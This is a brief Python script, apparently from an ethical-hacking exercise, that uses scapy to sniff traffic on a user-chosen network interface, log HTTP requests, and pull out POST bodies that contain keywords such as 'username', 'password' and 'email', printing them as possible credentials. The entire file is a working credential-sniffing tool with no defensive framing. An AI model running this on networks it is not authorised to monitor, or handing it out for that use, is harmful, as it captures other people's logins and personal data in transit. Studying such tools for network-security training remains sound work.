import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Decode HTTP request details
        host = packet[http.HTTPRequest].Host.decode(errors='ignore') if packet[http.HTTPRequest].Host else ""
        path = packet[http.HTTPRequest].Path.decode(errors='ignore') if packet[http.HTTPRequest].Path else ""
        method = packet[http.HTTPRequest].Method.decode(errors='ignore')
        print(f"[+] HTTP Request >> {method} {host}{path}")
        
        # Check for POST data
        if method == "POST" and packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load.lower():
                    print(f"\n\n\n[+] Possible password/username >> {load}\n\n\n")
                    break
        elif packet.haslayer(scapy.Raw):
            # Optionally print raw data for non-POST requests
            load = packet[scapy.Raw].load.decode(errors='ignore')
            print(f"[+] Raw Data >> {load}")

iface = get_interface()
sniff(iface)
